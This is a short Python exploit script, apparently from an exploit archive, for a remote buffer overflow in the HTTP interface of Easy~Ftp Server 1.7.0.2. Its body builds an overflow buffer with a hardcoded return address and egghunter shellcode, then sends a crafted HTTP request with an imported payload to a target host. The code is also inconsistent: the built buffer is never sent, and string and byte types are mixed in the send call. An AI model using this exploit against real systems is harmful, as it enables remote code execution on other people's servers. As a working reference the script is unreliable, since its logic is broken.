# Exploit Title: Easy~Ftp Server v1.7.0.2 (HTTP) Remote BOF Exploit
# Date: 18-02-2010
# Author: ThE g0bL!N
# Software Link: http://cdnetworks-us-2.dl.sourceforge.net/project/easyftpsvr/easyftpsvr/1.7.0.2-en/easyftpsvr-1.7.0.2.zip
# Code :
#!/usr/bin/python

import sys
import socket


from time import sleep
from base64 import b64encode
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

    user = b"User"
    pwd = b"PASS"
    auth = b64encode(user+b":"+pwd)

    # win32_exec - EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
    

    egghunter=(
    "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x44\x7A\x32\x37\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

    buffer = "\x61"*268
    buffer += "\xF0\x69\x83\x7C" #CALL ESP XP SP3
    buffer += "\x63"*8
    buffer += egghunter

    head = "GET /list.html?path="+str(buf)+" HTTP/1.1\r\n"
    head += "Host: "+str(buf)+"\r\n"
    head += "Authorization: Basic "+str(auth)+"\r\n"

    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target_machine,target_port))
        s.send(head + b"\r\n")
        
        s.close()
    except:
       print("Cannot Connect with Target_machine")